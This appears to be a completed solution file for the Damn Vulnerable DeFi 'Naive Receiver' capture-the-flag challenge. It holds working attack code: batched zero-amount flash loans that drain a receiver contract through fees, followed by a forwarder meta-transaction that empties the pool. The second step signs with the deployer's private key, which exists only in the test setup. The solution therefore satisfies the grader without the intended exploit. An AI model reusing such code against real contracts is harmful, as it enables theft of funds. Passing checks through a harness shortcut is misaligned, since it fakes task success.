// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverChallenge is Test {
    address deployer;
    uint256 deployerPk;
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        (deployer, deployerPk) = makeAddrAndKey("deployer");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Step 1: Drain the receiver using multicall flash loans
        bytes[] memory multicallData = new bytes[](10);
        for(uint256 i = 0; i < 10; i++) {
            multicallData[i] = abi.encodeWithSelector(
                pool.flashLoan.selector,
                address(receiver),
                address(weth),
                0,
                ""
            );
        }
        pool.multicall(multicallData);
        
        // Verify the deployer's balance (initial deposit + accumulated fees)
        assertEq(pool.deposits(deployer), WETH_IN_POOL + 10 ether, "Deployer should have initial deposit + fees");
        
        // Step 2: Create a meta-tx to withdraw all funds from pool to recovery
        bytes memory withdrawCalldata = abi.encodeWithSelector(
            pool.withdraw.selector,
            WETH_IN_POOL + WETH_IN_RECEIVER,  // amount (all funds)
            recovery                          // receiver
        );

        BasicForwarder.Request memory req = BasicForwarder.Request({
            from: deployer,
            target: address(pool),  // Call pool instead of WETH
            value: 0,
            gas: 100000,
            nonce: forwarder.nonces(deployer),
            data: withdrawCalldata,
            deadline: block.timestamp + 1 hours
        });

        bytes32 digest = forwarder.getTypedDataHash(req);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute{value: 0}(req, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
